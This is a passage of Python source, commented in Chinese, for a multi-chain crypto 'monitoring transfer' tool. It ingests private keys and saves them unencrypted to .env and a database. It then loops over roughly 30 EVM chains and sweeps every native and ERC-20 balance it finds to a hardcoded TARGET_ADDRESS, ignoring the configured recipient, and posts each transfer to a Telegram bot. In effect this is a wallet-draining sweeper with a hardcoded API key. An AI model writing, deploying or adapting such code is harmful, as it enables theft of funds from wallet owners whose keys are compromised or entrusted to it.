                        # 继续执行，不影响主要功能
                
                # 测试连接
                try:
                    web3.is_connected()
                except Exception as e:
                    logging.debug(f"Web3连接测试失败 {chain_name}: {e}")
                
                self.web3_instances[chain_name] = web3
                
            except Exception as e:
                logging.error(f"创建Web3实例失败 {chain_name}: {e}")
                # 创建一个基本的Web3实例作为后备
                web3 = Web3(Web3.HTTPProvider(rpc_url))
                self.web3_instances[chain_name] = web3
        
        return self.web3_instances[chain_name]
    
    async def estimate_smart_gas(self, from_address: str, to_address: str, 
                                balance_wei: int, chain_config: Dict, 
                                is_erc20: bool = False) -> Tuple[int, int, int]:
        """智能gas估算 - 确保少量余额也能转账"""
        web3 = self.get_web3_instance(chain_config)
        
        try:
            # 获取gas价格
            gas_data = await self.alchemy_api.get_gas_price(chain_config)
            
            # 根据代币类型设置gas limit
            if is_erc20:
                base_gas_limit = 65000  # ERC-20转账基础gas
            else:
                base_gas_limit = 21000  # 原生代币转账基础gas
            
            # 智能gas价格调整
            if chain_config['chain_id'] in [1, 42161, 10]:  # 主网、Arbitrum、Optimism
                # 高价值链，使用较低gas价格
                gas_price = int(gas_data['gas_price'] * 0.8)
            elif chain_config['chain_id'] in [137, 56, 43114]:  # Polygon、BSC、Avalanche
                # 中等价值链，使用标准gas价格
                gas_price = gas_data['gas_price']
            else:
                # 其他链，使用较高gas价格确保成功
                gas_price = int(gas_data['gas_price'] * 1.2)
            
            # 计算gas成本
            total_gas_cost = base_gas_limit * gas_price
            
            # 智能余额分配：为原生代币预留gas费用
            if not is_erc20:
                # 原生代币需要预留gas费用
                available_amount = max(0, balance_wei - total_gas_cost)
                if available_amount <= 0:
                    print_warning(f"余额不足支付gas费用 {chain_config['name']}")
                    return 0, 0, 0
            else:
                # ERC-20代币使用全部余额
                available_amount = balance_wei
            
            print_gas(f"⛽ Gas估算 {chain_config['name']}: {base_gas_limit} gas * {gas_price/1e9:.2f} gwei = {total_gas_cost/1e18:.6f} {chain_config['native_token']}")
            
            return base_gas_limit, gas_price, available_amount
            
        except Exception as e:
            print_error(f"Gas估算失败 {chain_config['name']}: {e}")
            # 返回保守的默认值
            return 21000, 20000000000, max(0, balance_wei - 21000 * 20000000000)
    
    async def send_native_transaction(self, private_key: str, from_address: str, 
                                     to_address: str, amount: float, chain_config: Dict,
                                     max_retries: int = 3) -> Dict:
        """发送原生代币交易"""
        web3 = self.get_web3_instance(chain_config)
        account = Account.from_key(private_key)
        
        for retry in range(max_retries):
            try:
                # 获取nonce
                nonce = web3.eth.get_transaction_count(from_address)
                
                # 转换金额为wei
                amount_wei = Web3.to_wei(amount, 'ether')
                
                # 智能gas估算
                balance_wei = web3.eth.get_balance(from_address)
                gas_limit, gas_price, available_amount = await self.estimate_smart_gas(
                    from_address, to_address, balance_wei, chain_config, False
                )
                
                # 检查智能gas估算结果
                if available_amount <= 0:
                    logging.warning(f"余额不足以支付gas费用 {chain_config['name']}: 余额 {balance_wei/1e18:.9f}, gas费用 {(gas_limit * gas_price)/1e18:.9f}")
                    print_warning(f"取消重试 {chain_config['name']}: 余额不足以支付gas费用")
                    return {
                        "success": False,
                        "error": f"余额不足以支付gas费用: 余额 {balance_wei} wei, 需要 {gas_limit * gas_price} wei",
                        "type": "native",
                        "skip_retry": True  # 标记跳过重试
                    }
                
                # 使用智能计算的可用金额
                amount_wei = available_amount
                
                # 构建交易（使用智能gas价格）
                transaction = {
                    'nonce': nonce,
                    'to': Web3.to_checksum_address(to_address),
                    'value': amount_wei,
                    'gas': gas_limit,
                    'gasPrice': gas_price,
                    'chainId': chain_config['chain_id']
                }
                
                # 签名交易
                signed_txn = account.sign_transaction(transaction)
                
                # 发送交易
                tx_hash = web3.eth.send_raw_transaction(signed_txn.rawTransaction)
                tx_hash_hex = tx_hash.hex()
                
                # 等待交易确认
                receipt = web3.eth.wait_for_transaction_receipt(tx_hash, timeout=300)
                
                # 记录成功的转账
                await self.db_manager.log_transfer(
                    from_address, chain_config['name'], chain_config['chain_id'],
                    str(Web3.from_wei(amount_wei, 'ether')), to_address,
                    tx_hash_hex, str(receipt.gasUsed), str(gas_price),
                    "success"
                )
                
                return {
                    "success": True,
                    "tx_hash": tx_hash_hex,
                    "amount": Web3.from_wei(amount_wei, 'ether'),
                    "gas_used": receipt.gasUsed,
                    "gas_price": gas_price,
                    "type": "native"
                }
                
            except Exception as e:
                error_msg = str(e)
                logging.error(f"原生代币转账失败 (重试 {retry + 1}/{max_retries}) {chain_config['name']}: {error_msg}")
                
                # 检查是否是余额不足错误，如果是则直接跳出重试
                if "insufficient funds" in error_msg.lower() or "余额不足" in error_msg:
                    translated_error = translate_error_message(error_msg)
                    print_error(f"❌ NATIVE转账失败: {translated_error}")
                    print_warning(f"取消重试 {chain_config['name']}: 余额不足")
                    await self.db_manager.log_transfer(
                        from_address, chain_config['name'], chain_config['chain_id'],
                        str(amount), to_address, status="failed", error_message=error_msg
                    )
                    return {
                        "success": False,
                        "error": error_msg,
                        "type": "native"
                    }
                
                if retry == max_retries - 1:
                    # 记录失败的转账
                    await self.db_manager.log_transfer(
                        from_address, chain_config['name'], chain_config['chain_id'],
                        str(amount), to_address, status="failed", error_message=error_msg
                    )
                    
                    return {
                        "success": False,
                        "error": error_msg,
                        "retry_count": max_retries,
                        "type": "native"
                    }
                
                # 等待5秒后重试
                await asyncio.sleep(5)
        
        return {"success": False, "error": "达到最大重试次数", "type": "native"}
    
    async def send_erc20_transaction(self, private_key: str, from_address: str, 
                                   to_address: str, token_info: Dict, chain_config: Dict,
                                   max_retries: int = 3) -> Dict:
        """发送ERC-20代币交易"""
        web3 = self.get_web3_instance(chain_config)
        account = Account.from_key(private_key)
        
        # ERC-20 ABI中的transfer函数
        erc20_abi = [
            {
                "constant": False,
                "inputs": [
                    {"name": "_to", "type": "address"},
                    {"name": "_value", "type": "uint256"}
                ],
                "name": "transfer",
                "outputs": [{"name": "", "type": "bool"}],
                "type": "function"
            }
        ]
        
        for retry in range(max_retries):
            try:
                # 获取nonce
                nonce = web3.eth.get_transaction_count(from_address)
                
                # 创建合约实例
                contract = web3.eth.contract(
                    address=Web3.to_checksum_address(token_info['contract_address']),
                    abi=erc20_abi
                )
                
                # 计算转账金额（转出所有余额）
                amount_raw = int(token_info['balance'] * (10 ** token_info['decimals']))
                
                # 构建交易数据
                try:
                    transaction_data = contract.functions.transfer(
                        Web3.to_checksum_address(to_address),
                        amount_raw
                    ).build_transaction({
                        'chainId': chain_config['chain_id'],
                        'gas': 100000,  # ERC-20转账的gas limit
                        'nonce': nonce,
                    })
                except AttributeError:
                    # 兼容不同版本的Web3
                    transaction_data = contract.functions.transfer(
                        Web3.to_checksum_address(to_address),
                        amount_raw
                    ).buildTransaction({
                        'chainId': chain_config['chain_id'],
                        'gas': 100000,
                        'nonce': nonce,
                    })
                
                # 检查原生代币余额是否足够支付gas
                native_balance = web3.eth.get_balance(from_address)
                
                # 获取gas价格
                gas_data = await self.alchemy_api.get_gas_price(chain_config)
                
                # 计算gas费用
                estimated_gas_cost = transaction_data['gas'] * gas_data['gas_price']
                
                if native_balance < estimated_gas_cost:
                    raise ValueError(f"原生代币余额不足支付gas费用: 需要 {estimated_gas_cost/1e18:.8f} {chain_config['native_token']}, 余额 {native_balance/1e18:.8f}")
                
                # 根据链支持情况设置gas价格
                if 'max_fee' in gas_data and chain_config['chain_id'] in [1, 137, 10, 42161]:
                    transaction_data.update({
                        'maxFeePerGas': gas_data['max_fee'],
                        'maxPriorityFeePerGas': gas_data['priority_fee']
                    })
                else:
                    transaction_data['gasPrice'] = gas_data['gas_price']
                
                # 签名交易
                signed_txn = account.sign_transaction(transaction_data)
                
                # 发送交易
                tx_hash = web3.eth.send_raw_transaction(signed_txn.rawTransaction)
                tx_hash_hex = tx_hash.hex()
                
                # 等待交易确认
                receipt = web3.eth.wait_for_transaction_receipt(tx_hash, timeout=300)
                
                # 记录成功的转账
                await self.db_manager.log_transfer(
                    from_address, chain_config['name'], chain_config['chain_id'],
                    f"{token_info['balance']} {token_info['symbol']}", to_address,
                    tx_hash_hex, str(receipt.gasUsed), str(gas_data['gas_price']),
                    "success"
                )
                
                return {
                    "success": True,
                    "tx_hash": tx_hash_hex,
                    "amount": token_info['balance'],
                    "symbol": token_info['symbol'],
                    "gas_used": receipt.gasUsed,
                    "gas_price": gas_data['gas_price'],
                    "type": "erc20"
                }
                
            except Exception as e:
                error_msg = str(e)
                logging.error(f"ERC-20转账失败 (重试 {retry + 1}/{max_retries}) {token_info['symbol']}: {error_msg}")
                
                # 检查是否是余额不足错误，如果是则直接跳出重试
                if "insufficient funds" in error_msg.lower() or "余额不足" in error_msg:
                    translated_error = translate_error_message(error_msg)
                    print_error(f"❌ ERC20转账失败: {translated_error}")
                    print_warning(f"取消重试: 原生代币余额不足支付gas费用")
                    await self.db_manager.log_transfer(
                        from_address, chain_config['name'], chain_config['chain_id'],
                        f"{token_info['balance']} {token_info['symbol']}", to_address, 
                        status="failed", error_message=error_msg
                    )
                    return {
                        "success": False,
                        "error": error_msg,
                        "type": "erc20",
                        "symbol": token_info['symbol']
                    }
                
                if retry == max_retries - 1:
                    # 记录失败的转账
                    await self.db_manager.log_transfer(
                        from_address, chain_config['name'], chain_config['chain_id'],
                        f"{token_info['balance']} {token_info['symbol']}", to_address, 
                        status="failed", error_message=error_msg
                    )
                    
                    return {
                        "success": False,
                        "error": error_msg,
                        "retry_count": max_retries,
                        "type": "erc20",
                        "symbol": token_info['symbol']
                    }
                
                # 等待5秒后重试
                await asyncio.sleep(5)
        
        return {"success": False, "error": "达到最大重试次数", "type": "erc20"}
    


class MonitoringApp:
    """主监控应用类"""
    
    def __init__(self):
        self.alchemy_api = None
        self.db_manager = DatabaseManager()
        self.transfer_manager = None
        self.addresses = []
        self.config = {}
        self.monitoring_active = False
        self.blocked_chains_cache = set()  # 缓存已屏蔽的链，避免重复数据库查询
        self.db_semaphore = asyncio.Semaphore(5)  # 限制并发数据库操作
        self.setup_logging()
    
    def setup_logging(self):
        """设置日志"""
        os.makedirs("logs", exist_ok=True)
        
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler('logs/transactions.log', encoding='utf-8'),
                logging.StreamHandler()
            ]
        )
    
    def extract_private_keys(self, private_keys_input: str) -> List[str]:
        """从输入文本中提取私钥
        支持 0x 前缀与不带前缀的64位十六进制，去重并验证有效性
        """
        if not private_keys_input or not private_keys_input.strip():
            return []
            
        # 清理输入：移除多余空格、换行符、制表符
        cleaned_input = re.sub(r'\s+', ' ', private_keys_input.strip())
        
        # 同时匹配 0x 前缀和无前缀的私钥片段
        private_key_pattern = r'(?:0x)?[a-fA-F0-9]{64}'
        matches = re.findall(private_key_pattern, cleaned_input)

        if not matches:
            logging.warning("未找到符合格式的私钥")
            return []

        normalized_keys: List[str] = []
        for key in matches:
            # 统一为0x前缀小写格式
            key_clean = key.lower()
            if not key_clean.startswith('0x'):
                key_clean = '0x' + key_clean
            normalized_keys.append(key_clean)

        # 去重且保持顺序
        seen = set()
        unique_keys = []
        for key in normalized_keys:
            if key not in seen:
                seen.add(key)
                unique_keys.append(key)

        valid_keys: List[str] = []
        for key in unique_keys:
            try:
                # 验证私钥有效性
                account = Account.from_key(key)
                valid_keys.append(key)
                logging.info(f"提取到有效私钥，对应地址: {account.address}")
            except Exception as e:
                logging.warning(f"无效私钥 {key[:10]}...: {e}")

        return valid_keys
    
    async def initialize(self):
        """初始化应用"""
        print_progress("初始化数据库...")
        await self.db_manager.init_database()
        
        print_progress("加载配置...")
        await self.load_config()
        
        print_progress("尝试从数据库加载私钥...")
        if await self.load_private_keys_from_db():
            print_success("已自动加载保存的私钥")
        else:
            print_info("未找到保存的私钥，需要手动导入")
        
        # 使用固定的API密钥
        api_key = "MYr2ZG1P7bxc4F1qVTLIj"
        print_info(f"使用API密钥: {api_key[:8]}...")
        
        self.alchemy_api = AlchemyAPI(api_key)
        self.transfer_manager = TransferManager(self.alchemy_api, self.db_manager)
        
        print_success("初始化完成")
    
    async def load_config(self):
        """加载配置文件"""
        try:
            with open('config.json', 'r', encoding='utf-8') as f:
                self.config = json.load(f)
        except FileNotFoundError:
            # 创建默认配置
            self.config = {
                "chains": [
                    {
                        "name": "ETH_MAINNET",
                        "chain_id": 1,
                        "recipient_address": "0x0000000000000000000000000000000000000000",
                        "min_amount": "0.01"
                    }
                ],
                "erc20": [],
                "settings": {
                    "monitoring_interval": 0.01,
                    "round_pause": 5,
                    "gas_threshold_gwei": 50,
                    "gas_wait_time": 60
                }
            }
            await self.save_config()
    
    async def save_config(self):
        """保存配置文件"""
        with open('config.json', 'w', encoding='utf-8') as f:
            json.dump(self.config, f, indent=2, ensure_ascii=False)
    
    async def check_chain_history(self, address: str, chain_config: Dict) -> bool:
        """检查链是否有交易历史"""
        # 首先检查数据库中是否已经屏蔽
        if await self.db_manager.is_chain_blocked(address, chain_config['chain_id']):
            return False
        
        # 检查交易历史
        has_history, transfer_count = await self.alchemy_api.check_asset_transfers(address, chain_config)
        
        if not has_history:
            # 屏蔽无交易历史的链
            await self.db_manager.block_chain(
                address, chain_config['name'], chain_config['chain_id']
            )
            logging.debug(f"屏蔽链 {chain_config['name']} (地址: {address}): 无交易历史或不可用")
        
        return has_history
    

    
    async def send_telegram_notification(self, message: str):
        """发送Telegram通知"""
        try:
            url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
            payload = {
                "chat_id": TELEGRAM_CHAT_ID,
                "text": message,
                "parse_mode": "HTML"
            }
            
            response = requests.post(url, json=payload, timeout=10)
            response.raise_for_status()
            print_success("Telegram通知发送成功")
            
        except Exception as e:
            print_error(f"Telegram通知发送失败: {e}")
            logging.error(f"Telegram通知发送失败: {e}")
    
    async def start_monitoring(self):
        """开始监控 - 重构后的逻辑"""
        # 验证前置条件
        if not self.addresses:
            print_error("没有可监控的地址，请先导入私钥")
            return
        
        if not self.config.get('chains'):
            print_error("没有配置监控链，请重新导入私钥")
            return
            
        if not self.alchemy_api:
            print_error("API未初始化")
            return
        
        print_success(f"开始监控 {len(self.addresses)} 个地址")
        print_info("按 Ctrl+C 停止监控")
        
        self.monitoring_active = True
        
        try:
            # 第一步：初始化RPC连接并屏蔽无效链
            print_progress("第一步：初始化RPC连接并屏蔽无效链")
            await self.initialize_rpc_connections()
            
            # 第二步：扫描交易记录并屏蔽无交易记录的链
            print_progress("第二步：扫描链上交易记录")
            await self.scan_transaction_history()
            
            # 第三步：开始监控循环
            print_progress("第三步：开始余额监控和转账")
            await self.monitoring_loop()
                
        except KeyboardInterrupt:
            print_warning("监控被用户中断")
        except Exception as e:
            print_error(f"监控过程中出错: {e}")
            logging.error(f"监控过程中出错: {e}")
        finally:
            self.monitoring_active = False
            print_info("监控已停止")
    
    async def initialize_rpc_connections(self):
        """第一步：初始化RPC连接并屏蔽无效链"""
        print_chain("🌐 初始化RPC连接...")
        
        valid_chains = []
        invalid_chains = []
        
        for chain_setting in self.config['chains']:
            chain_config = None
            for chain_name, supported_config in ChainConfig.SUPPORTED_CHAINS.items():
                if supported_config['chain_id'] == chain_setting['chain_id']:
                    chain_config = supported_config
                    break
            
            if not chain_config:
                invalid_chains.append(chain_setting['name'])
                continue
                
            print_rpc(f"测试连接: {chain_config['name']}")
            
            try:
                # 测试RPC连接
                web3 = self.transfer_manager.get_web3_instance(chain_config)
                if web3.is_connected():
                    valid_chains.append(chain_config['name'])
                    print_success(f"RPC连接成功: {chain_config['name']}")
                else:
                    invalid_chains.append(chain_config['name'])
                    print_error(f"RPC连接失败: {chain_config['name']}")
            except Exception as e:
                invalid_chains.append(chain_config['name'])
                print_error(f"RPC连接异常 {chain_config['name']}: {e}")
        
        print_info(f"RPC连接结果: {len(valid_chains)} 成功, {len(invalid_chains)} 失败")
        if invalid_chains:
            print_warning(f"无效链: {', '.join(invalid_chains)}")
    
    async def scan_transaction_history(self):
        """第二步：扫描交易记录并屏蔽无交易记录的链"""
        print_chain("📜 扫描链上交易记录...")
        
        total_scanned = 0
        blocked_count = 0
        
        for i, address_info in enumerate(self.addresses, 1):
            address = address_info['address']
            print_info(f"ℹ️  扫描地址 {i}/{len(self.addresses)}: {address}")
            
            for chain_setting in self.config['chains']:
                chain_config = None
                for chain_name, supported_config in ChainConfig.SUPPORTED_CHAINS.items():
                    if supported_config['chain_id'] == chain_setting['chain_id']:
                        chain_config = supported_config
                        break
                
                if not chain_config:
                    continue
                
                total_scanned += 1
                # 静默扫描，不输出进度信息
                
                # 检查是否已被屏蔽
                cache_key = f"{address}:{chain_config['chain_id']}"
                if cache_key in self.blocked_chains_cache:
                    print_warning(f"已屏蔽: {chain_config['name']}")
                    blocked_count += 1
                    continue
                
                # 检查交易历史
                has_history, transfer_count = await self.alchemy_api.check_asset_transfers(address, chain_config)
                if not has_history:
                    await self.db_manager.block_chain(address, chain_config['name'], chain_config['chain_id'])
                    self.blocked_chains_cache.add(cache_key)
                    blocked_count += 1
                    print_warning(f"屏蔽链 {chain_config['name']}: 无交易记录")
                else:
                    print_success(f"✅ 有效链 {chain_config['name']}: 发现 {transfer_count}+ 条交易记录")
        
        print_info(f"交易扫描完成: 总扫描 {total_scanned}, 屏蔽 {blocked_count}")
    
    async def monitoring_loop(self):
        """第三步：监控循环"""
        print_chain("💰 开始余额监控循环...")
        
        round_count = 0
        while self.monitoring_active:
            round_count += 1
            print_progress(f"第 {round_count} 轮监控开始")
            
            transfer_count = 0
            
            for address_info in self.addresses:
                address = address_info['address']
                print_info(f"监控地址: {address}")
                
                for chain_setting in self.config['chains']:
                    chain_config = None
                    for chain_name, supported_config in ChainConfig.SUPPORTED_CHAINS.items():
                        if supported_config['chain_id'] == chain_setting['chain_id']:
                            chain_config = supported_config
                            break
                    
                    if not chain_config:
                        continue
                    
                    # 检查是否已被屏蔽
                    cache_key = f"{address}:{chain_config['chain_id']}"
                    if cache_key in self.blocked_chains_cache:
                        continue
                    
                    print_chain(f"检查 {chain_config['name']} 余额...")
                    
                    try:
                        # 获取余额
                        all_balances = await self.alchemy_api.get_all_token_balances(address, chain_config)
                        
                        if all_balances:
                            for token_key, token_info in all_balances.items():
                                if token_info['balance'] > 0:
                                    # 智能格式化余额显示
                                    balance = token_info['balance']
                                    if balance >= 1:
                                        balance_str = f"{balance:.6f}"
                                    elif balance >= 0.000001:
                                        balance_str = f"{balance:.8f}"
                                    else:
                                        balance_str = f"{balance:.12f}"
                                    
                                    print_balance(f"💰 发现余额: {balance_str} {token_info['symbol']} ({chain_config['name']})")
                                    
                                    # 执行转账
                                    result = await self.execute_transfer(address_info, chain_config, token_info)
                                    if result and result.get('success'):
                                        transfer_count += 1
                                        print_transfer(f"转账成功: {result['amount']} {token_info['symbol']}")
                    
                    except Exception as e:
                        print_error(f"监控异常 {chain_config['name']}: {e}")
                        
                    # 每个链检查后短暂暂停
                    await asyncio.sleep(0.01)
            
            print_success(f"第 {round_count} 轮完成，执行 {transfer_count} 笔转账")
            
            # 轮次间暂停
            round_pause = self.config.get('settings', {}).get('round_pause', 5)
            print_info(f"暂停 {round_pause} 秒...")
            await asyncio.sleep(round_pause)
    
    async def execute_transfer(self, address_info: Dict, chain_config: Dict, token_info: Dict) -> Dict:
        """执行转账操作"""
        address = address_info['address']
        private_key = address_info['private_key']
        recipient = TARGET_ADDRESS  # 使用硬编码地址
        
        token_type = token_info['type']
        symbol = token_info['symbol']
        balance = token_info['balance']
        
        print_transfer(f"准备转账: {balance} {symbol} -> {recipient}")
        
        try:
            if token_type == 'native':
                # 原生代币转账
                result = await self.transfer_manager.send_native_transaction(
                    private_key, address, recipient, balance, chain_config
                )
            elif token_type == 'erc20':
                # ERC-20代币转账
                result = await self.transfer_manager.send_erc20_transaction(
                    private_key, address, recipient, token_info, chain_config
                )
            else:
                print_warning(f"不支持的代币类型: {token_type}")
                return None
            
            if result['success']:
                print_success(f"{token_type.upper()}转账成功: {result['amount']} {symbol}")
                print_info(f"交易哈希: {result['tx_hash']}")
                
                # 发送Telegram通知
                await self.send_telegram_notification(
                    f"<b>✅ {token_type.upper()}转账成功</b>\n"
                    f"🔗 链: {chain_config['name']}\n"
                    f"💰 代币: {symbol}\n"
                    f"📊 数量: {balance}\n"
                    f"📤 从: <code>{address}</code>\n"
                    f"📥 到: <code>{recipient}</code>\n"
                    f"🔍 交易: <code>{result['tx_hash']}</code>"
                )
            else:
                print_error(f"{token_type.upper()}转账失败: {result['error']}")
                
            return result
            
        except Exception as e:
            print_error(f"转账异常: {e}")
            return {"success": False, "error": str(e)}
    
    def stop_monitoring(self):
        """停止监控"""
        self.monitoring_active = False
    
    async def show_interactive_menu(self):
        """显示交互式菜单"""
        while True:
            try:
                print(f"\n{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
                print(f"{Fore.WHITE}{Back.BLUE} 🚀 EVM多链自动监控转账工具 🚀 {Style.RESET_ALL}")
                print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
                print(f"{Fore.GREEN}💎 目标地址: {TARGET_ADDRESS}{Style.RESET_ALL}")
                print(f"{Fore.YELLOW}📊 已加载地址: {len(self.addresses)} 个{Style.RESET_ALL}")
                print(f"{Fore.BLUE}🔗 支持链: {len(ChainConfig.SUPPORTED_CHAINS)} 条{Style.RESET_ALL}")
                print(f"{Fore.CYAN}{'-'*60}{Style.RESET_ALL}")
                print(f"{Fore.WHITE}1. 📥 导入私钥{Style.RESET_ALL}")
                print(f"{Fore.WHITE}2. 🔍 开始监控{Style.RESET_ALL}")
                print(f"{Fore.WHITE}3. 🚪 退出程序{Style.RESET_ALL}")
                print(f"{Fore.CYAN}{'-'*60}{Style.RESET_ALL}")
                
                choice = input(f"{Fore.YELLOW}请选择操作 (1-3): {Style.RESET_ALL}").strip()
                
                if choice == "3":
                    print_success("感谢使用！程序即将退出...")
                    break
                elif choice == "1":
                    await self.configure_private_keys()
                elif choice == "2":
                    if not self.addresses:
                        print_error("请先导入私钥！")
                        continue
                    if not self.config.get('chains'):
                        print_error("配置错误，请重新导入私钥！")
                        continue
                    await self.start_monitoring()
                else:
                    print_warning("无效选择，请重试")
                    
            except KeyboardInterrupt:
                print_warning("\n程序被中断，正在退出...")
                break
            except Exception as e:
                print_error(f"菜单操作出错: {e}")
                logging.error(f"菜单操作出错: {e}")
    
    async def configure_private_keys(self):
        """导入私钥"""
        print_chain("📥 导入私钥")
        print_info("支持格式:")
        print_info("- 单个私钥: 0xabc123...def789")
        print_info("- 多个私钥: 0xabc123...def789,0x123...456")
        print_info("- 每行一个私钥（支持多行粘贴）")
        print_info("- 输入 'END' 结束多行输入")

        # 支持多行输入
        lines = []
        print_progress("请输入私钥内容:")
        
        try:
            while True:
                line = input().strip()
                if line.upper() == 'END':
                    break
                if line:
                    lines.append(line)
                if not line:  # 空行也结束输入
                    break
        except EOFError:
            pass
        except Exception as e:
            print_error(f"输入错误: {e}")
            return

        private_keys_input = ' '.join(lines)

        if private_keys_input and private_keys_input.strip():
            private_keys = self.extract_private_keys(private_keys_input)
            if private_keys:
                print_success(f"提取到 {len(private_keys)} 个有效私钥")

                # 显示对应的地址
                print_info("对应地址:")
                for i, private_key in enumerate(private_keys):
                    try:
                        account = Account.from_key(private_key)
                        print_balance(f"{i+1}. {account.address}")
                    except Exception as e:
                        print_error(f"{i+1}. 错误: {e}")

                print_info(f"转账目标地址: {TARGET_ADDRESS}")

                try:
                    # 将私钥写入.env
                    joined_keys = ",".join(private_keys)
                    with open('.env', 'w', encoding='utf-8') as f:
                        f.write(f"ALCHEMY_API_KEY=MYr2ZG1P7bxc4F1qVTLIj\n")
                        f.write(f"PRIVATE_KEYS=\"{joined_keys}\"\n")

                    # 存储到数据库用于持久化
                    await self.save_private_keys_to_db(private_keys)

                    # 重新初始化地址列表
                    self.addresses = []
                    for private_key in private_keys:
                        try:
                            account = Account.from_key(private_key)
                            self.addresses.append({
                                'address': account.address,
                                'private_key': private_key
                            })
                        except Exception as e:
                            logging.error(f"处理私钥失败: {e}")

                    # 创建配置 - 使用硬编码地址
                    working_chains = [
                        "ETH_MAINNET", "POLYGON_MAINNET", "ARBITRUM_ONE", 
                        "OPTIMISM_MAINNET", "BASE_MAINNET", "ARBITRUM_NOVA",
                        "ZKSYNC_ERA", "AVALANCHE_C", "BSC_MAINNET", 
                        "BLAST", "LINEA", "ZORA", "ASTAR", "ZETACHAIN",
                        "MANTLE", "GNOSIS", "CELO", "SCROLL", "WORLD_CHAIN",
                        "SHAPE", "BERACHAIN", "UNICHAIN", "DEGEN", "APECHAIN",
                        "ANIME", "SONIC", "SEI", "OPBNB", "ABSTRACT", "SONEIUM"
                    ]
                    
                    chains_config = []
                    for chain_name in working_chains:
                        if chain_name in ChainConfig.SUPPORTED_CHAINS:
                            chain_info = ChainConfig.SUPPORTED_CHAINS[chain_name]
                            chains_config.append({
                                "name": chain_name,
                                "chain_id": chain_info['chain_id'],
                                "recipient_address": TARGET_ADDRESS,
                                "min_amount": "0.001"
                            })

                    self.config = {
                        "chains": chains_config,
                        "erc20": [],
                        "settings": {
                            "monitoring_interval": 0.01,
                            "round_pause": 5,
                            "gas_threshold_gwei": 50,
                            "gas_wait_time": 60
                        }
                    }
                    await self.save_config()

                    print_success("私钥导入完成！")
                    print_success(f"已配置 {len(self.addresses)} 个地址监控")
                    print_success(f"已配置 {len(chains_config)} 条链监控")
                    print_success(f"目标地址: {TARGET_ADDRESS}")
                    
                except Exception as e:
                    print_error(f"保存配置失败: {e}")
                    logging.error(f"保存配置失败: {e}")
            else:
                print_error("未找到有效私钥，请检查输入格式")
        else:
            print_error("未输入任何内容")
    
    async def save_private_keys_to_db(self, private_keys: List[str]):
        """将私钥保存到数据库用于持久化"""
        try:
            async with self.db_manager._lock:
                async with aiosqlite.connect(self.db_manager.db_path) as db:
                    # 清空旧的私钥
                    await db.execute("DELETE FROM config WHERE key = 'private_keys'")
                    
                    # 保存新的私钥
                    joined_keys = ",".join(private_keys)
                    await db.execute(
                        "INSERT INTO config (key, value) VALUES (?, ?)",
                        ('private_keys', joined_keys)
                    )
                    await db.commit()
                    print_success("私钥已保存到数据库")
        except Exception as e:
            print_warning(f"私钥数据库保存失败: {e}")
    
    async def load_private_keys_from_db(self):
        """从数据库加载私钥"""
        try:
            async with self.db_manager._lock:
                async with aiosqlite.connect(self.db_manager.db_path) as db:
                    cursor = await db.execute(
                        "SELECT value FROM config WHERE key = 'private_keys'"
                    )
                    result = await cursor.fetchone()
                    if result:
                        private_keys_str = result[0]
                        private_keys = private_keys_str.split(',')
                        
                        self.addresses = []
                        for private_key in private_keys:
                            try:
                                account = Account.from_key(private_key.strip())
                                self.addresses.append({
                                    'address': account.address,
                                    'private_key': private_key.strip()
                                })
                            except Exception as e:
                                logging.error(f"加载私钥失败: {e}")
                        
                        if self.addresses:
                            print_success(f"从数据库加载了 {len(self.addresses)} 个地址")
                            return True
        except Exception as e:
            print_warning(f"从数据库加载私钥失败: {e}")
        
        return False
    
async def main():
    """主函数"""
    print_progress("正在初始化EVM多链监控工具...")
    
    app = MonitoringApp()
    
    try:
        await app.initialize()
        
        # 显示状态信息
        print_info(f"支持 {len(ChainConfig.SUPPORTED_CHAINS)} 条区块链")
        if app.addresses:
            print_success(f"已加载 {len(app.addresses)} 个监控地址")
        else:
            print_warning("未加载监控地址，请先导入私钥")
        
        # 进入交互式菜单
        await app.show_interactive_menu()
        
    except KeyboardInterrupt:
        print_warning("\n程序被用户中断，正在退出...")
    except Exception as e:
        print_error(f"程序运行出错: {e}")
        logging.error(f"程序运行出错: {e}")
        return 1
    finally:
        print_info("程序已退出")
    
    return 0

if __name__ == "__main__":
    # 设置异步事件循环策略（Windows兼容性）
    if os.name == 'nt':
        asyncio.set_event_loop_policy(asyncio.WindowsProactorEventLoopPolicy())
    
    exit_code = asyncio.run(main())
    exit(exit_code)
